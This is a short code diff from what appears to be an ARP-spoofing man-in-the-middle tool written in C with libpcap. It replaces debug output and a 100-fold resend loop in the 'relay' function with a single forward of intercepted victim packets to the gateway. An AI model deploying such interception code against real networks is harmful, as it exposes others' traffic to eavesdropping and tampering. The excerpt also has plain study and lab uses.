@@ -88,30 +88,14 @@ int relay(const char *dev, pcap_t *pcap, u_int8_t *attacker_mac, u_int8_t *victi
                 }
                 else
                 {
-                    printf("read packet : ");
-                    for (int i = 0; i < 8; i++)
-                    {
-                        printf("%02x ", packet[i]);
-                    }
                     copy_mac(gate_mac, pkt->eth_.dmac_);
-                    printf("\n");
-                    payload = (u_char *)pkt;
-                    printf("modified packet : ");
-                    for (int i = 0; i < 8; i++)
+                    int res = pcap_sendpacket(pcap, (u_char *)pkt, header->len);
+                    if (res != 0)
                     {
-                        printf("%02x ", payload[i]);
+                        printf("pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
+                        return -1;
                     }
-                    printf("\n");
-                    for (int i = 0; i < 100; i++)
-                    {
 
-                        int res = pcap_sendpacket(pcap, (u_char *)pkt, header->len);
-                        if (res != 0)
-                        {
-                            printf("pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
-                            return -1;
-                        }
-                    }
                     printf("sent!");
                 }
             }
